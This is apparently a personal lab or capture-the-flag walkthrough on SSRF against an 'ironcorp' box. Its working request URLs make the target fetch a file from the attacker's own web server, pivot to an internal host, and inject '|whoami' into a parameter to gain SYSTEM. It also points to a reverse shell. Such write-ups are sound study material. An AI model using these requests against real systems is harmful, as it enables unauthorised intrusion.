**Server-Side Request Forgery (SSRF)** is a type of web security vulnerability that allows an attacker to make requests from the server-side application to an arbitrary destination. SSRF vulnerabilities occur when a server-side application processes user-supplied URLs or URIs in an insecure way, allowing attackers to abuse the functionality to:

1. Access internal resources (like private networks, services, and databases).
2. Enumerate internal network structures and services.
3. Bypass firewall rules.
4. Retrieve sensitive information, such as metadata from cloud instances.
5. Potentially gain remote code execution if combined with other vulnerabilities.


## Check out

- View the page source.
- Look for the following code:

	![[SSRF Vulnerability-20240829132452480.webp]]
	You can see the name of the field is "r".
- Create a text file on your attacking machine with any content. (i.e. hello.txt)
- Fire up a python server on the directory you created the file.
	`python3 -m http.server`
- Browse to http://admin.ironcorp.me:11025/?r=http://10.8.40.30:8000/hello.txt.
	![[SSRF Vulnerability-20240829133401094.webp]]

You can see the file's content on the page, so it's vulnerable to SSRF.

## Access the internal subdomain

Use it to perform an internal port scan and discover new services that are only available internally. This would help an attacker discover internally exposed services, evading their firewall (in the case of having one, of course).

- Browse http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025.

	![[SSRF Vulnerability-20240829134027720.webp]]

- Examine the page source.
	![[SSRF Vulnerability-20240829134333513.webp]]
	`http://internal.ironcorp.me:11025/name.php?name=`
	The name variable prints out an userâ€™s name.


## Command injection

Command injection vulnerabilities occur when an application passes unsafe user-supplied data (input) to a system shell or command interpreter without proper sanitization or validation. An attacker can exploit this vulnerability by injecting arbitrary commands into the executed commands to gain unauthorized access, execute arbitrary code, or compromise the entire system.

### Burp Suite

- Intercept the following URL with Proxy.
	http://admin.ironcorp.me:11025?r=http://internal.ironcorp.me:11025/name.php?name=peter

- Send the request to Repeater and add `|whoami`.
	![[SSRF Vulnerability-20240830135736534.webp]]
You can see the "whoami" command injection works and the user has superuser permissions. 
"**nt authorty\\system**"

**Next step:** [[Reverse shell]]
